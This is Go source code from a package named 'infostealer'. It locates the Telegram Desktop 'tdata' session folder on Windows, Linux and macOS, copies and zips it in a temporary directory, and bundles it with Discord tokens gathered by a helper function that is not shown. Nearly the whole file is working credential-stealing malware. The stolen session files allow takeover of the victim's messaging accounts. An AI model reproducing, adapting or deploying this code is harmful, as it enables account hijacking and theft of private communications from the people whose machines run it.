package infostealer

import (
	"archive/zip"
	"io"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
)

func zipFolder(folderpath string) []byte {
	zipfilepath := filepath.Join(os.TempDir(), randomstring(12)+".zip")
	zipfile, _ := os.Create(zipfilepath)
	zipwriter := zip.NewWriter(zipfile)
	defer os.Remove(zipfilepath)

	filepath.WalkDir(folderpath, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}

		relPath, _ := filepath.Rel(folderpath, path)

		zipPath := filepath.Join("tdata", relPath)

		writer, _ := zipwriter.Create(zipPath)

		file, _ := os.Open(path)
		io.Copy(writer, file)
		file.Close()
		return nil
	})

	zipwriter.Close()
	zipfile.Close()

	final, _ := os.ReadFile(zipfilepath)
	return final
}

func detectTelegramLocation() string {
	var user, _ = user.Current()
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop", "tdata")
	case "linux":
		_, err := os.Stat(filepath.Join("/home", user.Username, ".local", "share", "TelegramDesktop", "tdata"))
		if err == nil {
			return filepath.Join("/home", user.Username, ".local", "share", "TelegramDesktop", "tdata")
		} else if _, err := os.Stat(filepath.Join("/home", user.Username, ".var", "app", "org.telegram.desktop", "data", "TelegramDesktop", "tdata")); err == nil {
			return filepath.Join("/home", user.Username, ".var", "app", "org.telegram.desktop", "data", "TelegramDesktop", "tdata")
		} else {
			return filepath.Join("/home", user.Username, "snap", "telegram-desktop", "current", ".local", "share", "TelegramDesktop", "tdata")
		}
	case "darwin":
		return filepath.Join("/Users", user.Username, "Library", "Application Support", "Telegram Desktop", "tdata")
	default:
		return ""
	}
}

func copyDir(src string, dst string) error {
	return filepath.WalkDir(src, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}

		relPath, _ := filepath.Rel(src, path)
		targetPath := filepath.Join(dst, relPath)

		if d.IsDir() {
			return os.MkdirAll(targetPath, 0755)
		}

		return copyFile(path, targetPath)
	})
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

func getTelegramData() []byte {
	folderpath := filepath.Join(os.TempDir(), randomstring(10))
	location := detectTelegramLocation()
	copyDir(location, folderpath)
	defer os.RemoveAll(folderpath)

	return zipFolder(folderpath)
}

func Messaging() ([]Discord, []byte) {
	discord := getDiscordTokens()
	telegram := getTelegramData()
	return discord, telegram
}
